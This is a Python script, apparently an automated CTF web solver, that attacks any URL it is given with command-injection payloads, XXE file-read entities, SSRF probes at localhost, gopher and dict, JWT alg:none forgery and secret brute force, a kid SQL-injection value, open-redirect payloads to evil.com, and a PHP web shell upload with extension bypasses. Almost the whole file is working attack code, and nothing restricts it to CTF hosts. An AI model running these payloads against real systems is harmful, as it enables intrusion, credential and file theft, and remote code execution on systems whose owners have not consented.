#!/usr/bin/env python3
"""
web_advanced.py — Advanced Web CTF Scripts
Command Injection | XXE | SSRF | JWT | Open Redirect
For authorized CTF platforms: HackTheBox, TryHackMe, picoCTF
Usage: python web_advanced.py <url>
"""

import requests
import re
import sys
import json
import base64
import hmac
import hashlib
import itertools
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

TARGET = sys.argv[1] if len(sys.argv) > 1 else input("[?] Target URL: ").strip()
SESSION = requests.Session()
SESSION.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'})
FLAGS = []
FLAG_RE = [r'HTB\{[^}]+\}', r'THM\{[^}]+\}', r'FLAG\{[^}]+\}',
           r'flag\{[^}]+\}', r'CTF\{[^}]+\}', r'picoCTF\{[^}]+\}']

def log(msg, t="*"):
    c = {"+":" \033[92m", "*":"\033[94m", "!":"\033[93m", "-":"\033[91m"}
    print(f"{c.get(t,'')}[{t}] {msg}\033[0m")

def find_flags(text):
    for p in FLAG_RE:
        for m in re.findall(p, text, re.IGNORECASE):
            if m not in FLAGS:
                FLAGS.append(m)
                log(f"FLAG: {m}", "+")
    return FLAGS

def get(url, **kw):
    try:
        r = SESSION.get(url, timeout=10, **kw)
        find_flags(r.text)
        return r
    except: return None

def post(url, data=None, json_d=None, **kw):
    try:
        r = SESSION.post(url, data=data, json=json_d, timeout=10, **kw)
        find_flags(r.text)
        return r
    except: return None

def get_forms(url):
    r = get(url)
    if not r: return []
    soup = BeautifulSoup(r.text, 'html.parser')
    forms = []
    for form in soup.find_all('form'):
        inputs = {i.get('name',''): i.get('value','')
                  for i in form.find_all('input') if i.get('name')}
        forms.append({
            'action': urljoin(url, form.get('action', url)),
            'method': form.get('method','get').lower(),
            'inputs': inputs
        })
    return forms

def send_form(form, payload_field, payload):
    data = {k: (payload if k == payload_field else v)
            for k, v in form['inputs'].items()}
    if form['method'] == 'post':
        return post(form['action'], data=data)
    return get(form['action'], params=data)


# ════════════════════════════════════════════
# 1. COMMAND INJECTION
# ════════════════════════════════════════════

def check_cmdi(url):
    log("Testing Command Injection...", "*")

    payloads = [
        "; cat /flag",          "| cat /flag",
        "& cat /flag",          "`cat /flag`",
        "$(cat /flag)",         "; cat /flag.txt",
        "| cat /flag.txt",      "; cat /etc/passwd",
        "&& cat /flag",         "\n cat /flag",
        "; id",                 "| id",
        "$(id)",                "`id`",
        "; cat /root/flag.txt", "; ls /",
        "; find / -name flag* 2>/dev/null | head -5",
    ]

    for form in get_forms(url):
        for field in form['inputs']:
            if any(k in field.lower() for k in
                   ['cmd', 'exec', 'command', 'run', 'ip', 'host',
                    'ping', 'query', 'search', 'input', 'name']):
                for p in payloads:
                    r = send_form(form, field, p)
                    if r:
                        find_flags(r.text)
                        if 'root:' in r.text:
                            log(f"CMDi via {field}: {p}", "+")
                        if FLAGS: return

    # URL param injection
    for param in ['cmd', 'exec', 'command', 'run', 'ip', 'host', 'ping', 'q']:
        for p in payloads[:8]:
            r = get(url, params={param: p})
            if r:
                find_flags(r.text)
                if 'root:' in r.text or FLAGS:
                    log(f"CMDi via URL param {param}", "+")
                    return


# ════════════════════════════════════════════
# 2. XXE — XML External Entity
# ════════════════════════════════════════════

def check_xxe(url):
    log("Testing XXE...", "*")

    xxe_payloads = [
        # Linux flag files
        '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>''',

        '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<root>&xxe;</root>''',

        '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',

        '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///root/flag.txt">]>
<root>&xxe;</root>''',

        # PHP filter (source code disclosure)
        '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=/flag">]>
<root>&xxe;</root>''',

        # SSRF via XXE
        '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/flag">]>
<root>&xxe;</root>''',
    ]

    headers_xml = {'Content-Type': 'application/xml'}
    headers_json_xml = {'Content-Type': 'text/xml'}

    for payload in xxe_payloads:
        r = SESSION.post(url, data=payload, headers=headers_xml, timeout=10)
        if r:
            find_flags(r.text)
            if 'root:' in r.text:
                log(f"XXE confirmed: /etc/passwd readable", "+")
            if FLAGS: return

        # Try JSON endpoint with XML body
        r2 = SESSION.post(url, data=payload, headers=headers_json_xml, timeout=10)
        if r2:
            find_flags(r2.text)
            if FLAGS: return

    # Check upload endpoints for XXE via SVG/XML file
    svg_xxe = '''<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text y="20">&xxe;</text></svg>'''

    soup = BeautifulSoup(get(url).text if get(url) else '', 'html.parser')
    for inp in soup.find_all('input', type='file'):
        form = inp.find_parent('form')
        if form:
            files = {inp.get('name','file'):
                     ('evil.svg', svg_xxe, 'image/svg+xml')}
            try:
                r = SESSION.post(urljoin(url, form.get('action','')),
                                 files=files, timeout=10)
                find_flags(r.text)
            except: pass


# ════════════════════════════════════════════
# 3. SSRF — Server Side Request Forgery
# ════════════════════════════════════════════

def check_ssrf(url):
    log("Testing SSRF...", "*")

    internal_targets = [
        "http://127.0.0.1/flag",
        "http://127.0.0.1/flag.txt",
        "http://localhost/flag",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8000/",
        "http://127.0.0.1:3000/",
        "http://0.0.0.0/flag",
        "file:///flag",
        "file:///flag.txt",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stat",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    ssrf_params = ['url', 'uri', 'link', 'src', 'source', 'target',
                   'redirect', 'fetch', 'load', 'path', 'dest', 'img',
                   'image', 'host', 'site', 'endpoint', 'callback']

    for param in ssrf_params:
        for target_url in internal_targets:
            r = get(url, params={param: target_url})
            if r and r.status_code == 200:
                find_flags(r.text)
                if 'root:' in r.text:
                    log(f"SSRF via {param}={target_url}", "+")
                if FLAGS: return

    # Check forms
    for form in get_forms(url):
        for field in form['inputs']:
            if any(k in field.lower() for k in ssrf_params):
                for target_url in internal_targets[:5]:
                    r = send_form(form, field, target_url)
                    if r:
                        find_flags(r.text)
                        if FLAGS: return


# ════════════════════════════════════════════
# 4. JWT ATTACKS
# ════════════════════════════════════════════

def decode_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) != 3: return None, None
        header = json.loads(base64.b64decode(parts[0] + '=='))
        payload = json.loads(base64.b64decode(parts[1] + '=='))
        return header, payload
    except: return None, None

def encode_jwt(header, payload, secret=b'', alg='HS256'):
    def b64(d): return base64.urlsafe_b64encode(
        json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()
    data = f"{b64(header)}.{b64(payload)}"
    if alg == 'none':
        return f"{data}."
    sig = hmac.new(secret, data.encode(), hashlib.sha256).digest()
    return f"{data}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"

def check_jwt(url):
    log("Testing JWT attacks...", "*")

    r = get(url)
    if not r: return

    # Find JWT in cookies or response
    token = None
    for name, val in SESSION.cookies.items():
        if val.count('.') == 2:
            token = val
            log(f"JWT found in cookie '{name}': {val[:50]}...", "!")
            break

    # Check Authorization header usage
    auth = r.headers.get('Authorization', '')
    if 'Bearer' in auth:
        token = auth.split(' ')[1]

    if not token:
        log("No JWT found automatically", "-")
        token = input("[?] Paste JWT token (or press enter to skip): ").strip()
        if not token: return

    header, payload = decode_jwt(token)
    if not header or not payload:
        log("Invalid JWT format", "-")
        return

    log(f"JWT Header: {header}", "!")
    log(f"JWT Payload: {payload}", "!")

    # Attack 1: alg:none
    log("Trying alg:none attack...", "*")
    payload_admin = dict(payload)
    for key in ['role', 'admin', 'isAdmin', 'user', 'username']:
        if key in payload_admin:
            payload_admin[key] = 'admin' if key != 'isAdmin' else True

    none_header = dict(header)
    none_header['alg'] = 'none'
    fake_token = encode_jwt(none_header, payload_admin, alg='none')
    SESSION.cookies.set(list(SESSION.cookies.keys())[-1]
                        if SESSION.cookies else 'token', fake_token)
    r2 = get(url)
    if r2: find_flags(r2.text)

    # Attack 2: weak secret brute force
    log("Brute forcing JWT secret...", "*")
    weak_secrets = [
        'secret', 'password', 'key', 'flag', 'jwt', 'admin',
        '123456', 'qwerty', 'letmein', 'supersecret', 'mysecret',
        'changeme', 'development', 'production', '', 'your-256-bit-secret',
    ]
    parts = token.split('.')
    data = f"{parts[0]}.{parts[1]}"
    original_sig = parts[2]

    for secret in weak_secrets:
        sig = hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
        test_sig = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        if test_sig == original_sig:
            log(f"JWT secret found: '{secret}'", "+")
            crafted = encode_jwt(none_header, payload_admin,
                                 secret=secret.encode())
            SESSION.cookies.set('token', crafted)
            r3 = get(url)
            if r3: find_flags(r3.text)
            break

    # Attack 3: kid header injection
    if 'kid' in header:
        log("Trying kid header injection...", "*")
        kid_payload = dict(header)
        kid_payload['kid'] = "' UNION SELECT 'secret' --"
        crafted = encode_jwt(kid_payload, payload_admin,
                             secret=b'secret')
        SESSION.cookies.set('token', crafted)
        r4 = get(url)
        if r4: find_flags(r4.text)


# ════════════════════════════════════════════
# 5. OPEN REDIRECT
# ════════════════════════════════════════════

def check_open_redirect(url):
    log("Testing Open Redirect...", "*")
    redirect_params = ['next', 'url', 'redirect', 'return', 'goto',
                       'target', 'redir', 'destination', 'continue',
                       'returnUrl', 'redirectUrl', 'back', 'forward']

    payloads = [
        'http://127.0.0.1/flag',
        'http://localhost/flag',
        '//evil.com',
        '/\\evil.com',
        'javascript:alert(1)',
    ]

    for param in redirect_params:
        for payload in payloads:
            r = get(url, params={param: payload},
                    allow_redirects=False)
            if r and r.status_code in [301, 302, 303, 307, 308]:
                location = r.headers.get('Location', '')
                if '127.0.0.1' in location or 'localhost' in location:
                    log(f"Open redirect: {param}={payload} → {location}", "+")
                    r2 = get(location)
                    if r2: find_flags(r2.text)


# ════════════════════════════════════════════
# 6. FILE UPLOAD RCE
# ════════════════════════════════════════════

def check_upload(url):
    log("Testing File Upload...", "*")

    php_shell = b'<?php system($_GET["c"]); ?>'
    php_shell2 = b'<?php echo shell_exec("cat /flag.txt"); ?>'

    r = get(url)
    if not r: return
    soup = BeautifulSoup(r.text, 'html.parser')

    for inp in soup.find_all('input', type='file'):
        form = inp.find_parent('form')
        if not form: continue
        action = urljoin(url, form.get('action', ''))
        field = inp.get('name', 'file')

        # Try PHP with various extensions
        for ext, content_type in [
            ('php', 'application/x-php'),
            ('php5', 'application/x-php'),
            ('phtml', 'text/html'),
            ('phar', 'application/x-php'),
            ('php.jpg', 'image/jpeg'),
        ]:
            files = {field: (f'shell.{ext}', php_shell2, content_type)}
            try:
                r2 = SESSION.post(action, files=files, timeout=10)
                find_flags(r2.text)

                # Try to access uploaded file
                for upload_path in ['/uploads/', '/upload/', '/files/', '/images/']:
                    r3 = get(urljoin(url, f"{upload_path}shell.{ext}"))
                    if r3 and 'shell_exec' not in r3.text:
                        find_flags(r3.text)
                        if r3.status_code == 200:
                            log(f"Upload success: {upload_path}shell.{ext}", "+")
            except: pass


# ════════════════════════════════════════════
# MAIN RUNNER
# ════════════════════════════════════════════

def run():
    print(f"""
\033[92m╔══════════════════════════════════════╗
║  ADVANCED WEB CTF SOLVER             ║
║  CMDi | XXE | SSRF | JWT | Upload    ║
║  Target: {TARGET[:28]:<28}║
╚══════════════════════════════════════╝\033[0m
""")
    for check in [check_cmdi, check_xxe, check_ssrf,
                  check_jwt, check_open_redirect, check_upload]:
        try:
            check(TARGET)
            if FLAGS:
                break
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"{check.__name__}: {e}", "-")

    print("\n\033[92m── RESULTS ──")
    if FLAGS:
        for f in FLAGS: print(f"  ✓ {f}")
    else:
        print("  No flags found automatically.")
        print("  Remaining manual checks: GraphQL, WebSockets, Race conditions")
    print("\033[0m")


if __name__ == "__main__":
    run()
